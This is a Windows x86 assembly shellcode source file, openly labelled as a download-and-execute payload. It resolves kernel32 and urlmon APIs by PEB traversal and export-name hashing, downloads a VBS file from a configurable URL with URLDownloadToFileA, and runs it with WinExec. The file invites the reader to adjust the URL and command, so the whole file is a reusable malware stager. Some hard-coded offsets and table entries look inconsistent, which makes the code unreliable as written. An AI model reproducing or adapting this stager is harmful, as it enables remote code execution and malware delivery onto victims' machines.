; =============================================================================
; Windows/x86 Shellcode: Download File & Execute via Dynamic API Resolution
; Description:
;   - Dynamically locates kernel32.dll and resolves CreateProcessA, LoadLibraryA.
;   - Loads urlmon.dll and resolves URLDownloadToFileA to download a file.
;   - Re-resolves kernel32.dll to get WinExec and execute a command.
;   - Uses PEB traversal and a hash-based mechanism for dynamic symbol resolution.
;
; Adjust CMD, FILENAME, and URL as needed.
; =============================================================================

[BITS 32]

global mainentrypoint
mainentrypoint:
    call get_eip
get_eip:
    pop edx                ; EDX now holds our EIP base
    lea edx, [edx-5]
    mov ebp, esp
    sub esp, 0x1000

    ; --- Stage 1: Resolve kernel32.dll and its API table ---
    push edx
    mov ebx, 0x4b1ffe8e     ; Kernel32.dll hash
    call get_module_address
    pop edx

    push ebp
    push edx
    mov ebp, eax          ; kernel32.dll base in EAX
    lea esi, [edx + KERNEL32HASHTABLE]
    lea edi, [edx + KERNEL32FUNCTIONSTABLE]
    call get_api_address
    pop edx
    pop ebp

    ; --- Stage 2: Load urlmon.dll and resolve URLDownloadToFileA ---
    push ebp
    push edx
    lea eax, [edx + URLMON]
    push eax
    call [edx + LoadLibraryA]
    pop edx
    pop ebp

    push ebp
    push edx
    mov ebp, eax         ; urlmon.dll base
    lea esi, [edx + URLMONHASHTABLE]
    lea edi, [edx + URLMONFUNCTIONSTABLE]
    call get_api_address
    pop edx
    pop ebp

    ; Call URLDownloadToFileA (params: NULL, URL, FILENAME, 0, 0)
    push eax              ; Dummy parameter for caller context
    push 0                ; Reserved
    push 0                ; Reserved
    lea edi, [edx + URL]
    lea esi, [edx + FILENAME]
    push esi              ; FILENAME
    push edi              ; URL
    push 0                ; pCaller = NULL
    call eax              ; Execute URLDownloadToFileA

    ; --- Stage 3: Re-resolve kernel32.dll to get WinExec ---
    call get_eip2
get_eip2:
    pop edx
    lea edx, [edx-122]
    mov ebp, esp
    sub esp, 0x1000

    push edx
    mov ebx, 0x4b1ffe8e   ; Kernel32.dll hash again
    call get_module_address
    pop edx

    push ebp
    push edx
    mov ebp, eax
    lea esi, [edx + WINKERNEL32HASHTABLE]
    lea edi, [edx + WINKERNEL32FUNCTIONSTABLE]
    call get_api_address
    pop edx
    pop ebp

    ; Call WinExec with CMD (i.e. "cscript cats-dl.vbs")
    lea esi, [edx + CMD]
    push 0
    push esi
    push dword [edx + WINKERNEL32_WINEXEC]
    pop eax
    call eax

    ret

; =============================================================================
; Function: get_module_address
; Description: Traverses the PEB to locate a module whose hash matches EBX.
; =============================================================================
get_module_address:
    cld
    xor edi, edi
    mov edi, [FS:0x30]     ; PEB
    mov edi, [edi+0xC]     ; PEB_LDR_DATA
    mov edi, [edi+0x14]    ; InInitializationOrderModuleList
next_module_loop:
    mov esi, [edi+0x28]    ; Pointer to module name
    xor edx, edx
module_hash_loop:
    lodsw
    test al, al
    jz end_module_hash_loop
    cmp al, 'A'
    jb skip_hash
    cmp al, 'Z'
    ja skip_hash
    or al, 0x20          ; Convert to lowercase
skip_hash:
    rol edx, 7
    xor dl, al
    jmp module_hash_loop
end_module_hash_loop:
    cmp edx, ebx         ; Compare computed hash with target
    mov eax, [edi+0x10]  ; Module base address
    mov edi, [edi]
    jnz next_module_loop
    ret

; =============================================================================
; Function: get_api_address
; Description: Resolves API addresses by hashing export names.
; =============================================================================
get_api_address:
    mov edx, ebp
    add edx, [edx+0x3C]      ; PE header offset
    mov edx, [edx+0x78]      ; Export Directory RVA
    add edx, ebp
    mov ebx, [edx+0x20]      ; AddressOfNames RVA
    add ebx, ebp
    xor ecx, ecx           ; Function index counter

load_api_hash:
    push edi
    push esi
    mov esi, [esi]         ; Expected hash
load_api_name:
    mov edi, [ebx]
    add edi, ebp
    push edx
    xor edx, edx
create_hash_loop:
    rol edx, 7
    xor dl, [edi]
    inc edi
    cmp byte [edi], 0
    jnz create_hash_loop
    xchg eax, edx
    pop edx
    cmp eax, esi
    jz load_api_addy
    add ebx, 4
    inc ecx
    cmp [edx+0x18], ecx
    jnz load_api_name
    pop esi
    pop edi
    ret
load_api_addy:
    pop esi
    pop edi
    lodsd
    push esi
    push ebx
    mov ebx, ebp
    mov esi, ebx
    add ebx, [edx+0x24]
    lea eax, [ebx+ecx*2]
    movzx eax, word [eax]
    lea eax, [esi+eax*4]
    add eax, [edx+0x1C]
    mov eax, [eax]
    add eax, esi
    stosd
    pop ebx
    pop esi
    add ebx, 4
    inc ecx
    cmp dword [esi], 0xFFFF
    jnz load_api_hash
    ret

; =============================================================================
; Data Section
; =============================================================================
section .data
CMD:                db "cscript cats-dl.vbs", 0
FILENAME:           db "cats-dl.vbs", 0
URL:                db "http://127.0.0.1:8080/cats.vbs", 0
URLMON:             db "urlmon.dll", 0

KERNEL32HASHTABLE:
    dd 0x46318ac7     ; Hash for CreateProcessA
    dd 0xc8ac8026     ; Hash for LoadLibraryA
    dd 0xFFFF         ; Terminator

KERNEL32FUNCTIONSTABLE:
    dd 0x00000001     ; Identifier for CreateProcessA
    dd 0x00000002     ; Identifier for LoadLibraryA

WINKERNEL32HASHTABLE:
    dd 0xe8bf6dad     ; Hash for WinExec
    dd 0xFFFF         ; Terminator

WINKERNEL32FUNCTIONSTABLE:
WINKERNEL32_WINEXEC:  dd 0x00000000

URLMONHASHTABLE:
    dd 0xd95d2399     ; Hash for URLDownloadToFileA
    dd 0xFFFF         ; Terminator

URLMONFUNCTIONSTABLE:
URLDownloadToFileA:   dd 0x00000003
